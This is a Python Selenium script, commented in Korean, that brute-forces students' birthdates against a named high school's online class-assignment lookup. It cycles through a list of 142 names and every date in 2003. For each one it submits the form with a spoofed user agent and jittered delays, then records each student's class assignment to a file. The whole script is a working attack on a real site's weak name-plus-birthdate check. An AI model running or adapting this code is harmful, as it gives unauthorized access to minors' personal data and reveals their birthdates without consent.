from selenium import webdriver
import time
import random
import sys
import os
from bs4 import BeautifulSoup

'''
반배정을 내놔라 
제작자 : mtslzx (mtslzx@gmail.com)
버전 : 0.2 Alpha
설명 : 고등학교의 반배정 확인 시스템에 생일을 무차별 대입해 찾아내주는 프로그램입니다.
'''
# == 코드 시작 ==

# selenium 준비

options = webdriver.ChromeOptions()
options.add_argument('disable-infobars')
options.add_argument("user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36")
driver = webdriver.Chrome('chromedriver')
driver.implicitly_wait(30)

# name = input('이름을입력해주세요:')
fail = '[<td rowspan="2">조회 결과가 없습니다.</td>]'
end = 0
name_list = open('이름.txt', 'rt', encoding='utf-8')
#print(fail)
list = open('반배정.txt', 'at', encoding='utf-8')
# 홈페이지에 양식 입력
for i in range(142):  # 이름의 갯수에 맞추어 주세요.
        name = name_list.read(3)
        print("[시작] 현재 진행중인 이름:", name)
        for month in range(12):
            if end == 1:
                end = 0
                break
            else:
                for day in range(31):
                    date = '2003' + str('%02d'% (month+1)) + str('%02d'% (day+1))
                    driver.get('http://samcheonpo-h.gne.go.kr/samcheonpo-h/ad/selectClClasInqireInfo.do?clasInqireSn=22440')
                    driver.find_element_by_xpath('//*[@id="aditCol1"]').send_keys(name)  # 이름부분
                    print('[알림] 이름 입력')
                    driver.find_element_by_xpath('//*[@id="aditCol2"]').send_keys(date)  # 생일
                    print('[알림] 생일 입력')
                    driver.find_element_by_xpath('//*[@id="btn_search"]').click()  # 검색
                    print('[알림] 검색, 잠자기')
                    time.sleep(0.03 + random.uniform(0.001, 0.2))
                    html = driver.page_source
                    soup = BeautifulSoup(html, 'html.parser')
                    result = str(soup.select('#subContent > div > div:nth-child(7) > div.table_st > table > tbody > tr:nth-child(1) > td'))
                    #print(result)
                    if result != fail:
                            who = soup.select('#subContent > div > div:nth-child(7) > div.table_st > table > tbody > tr:nth-child(2) > td')
                            print("[성공] 결과값은", result, who, "입니다.")
                            writing = str(name) + ' : ' + str(who) + "\n"
                            list.write(writing)
                            end = 1
                            break
                    else:
                        print("[실패] 틀린 값:", date)

list.close()
print('[완료] 5초 후 프로그램이 종료됩니다.')
time.sleep(5)
os.system("taskkill /f /im chromedriver.exe")
os.system("taskkill /f /im chrome.exe")
sys.exit(0)

# == 코드 끝 ==
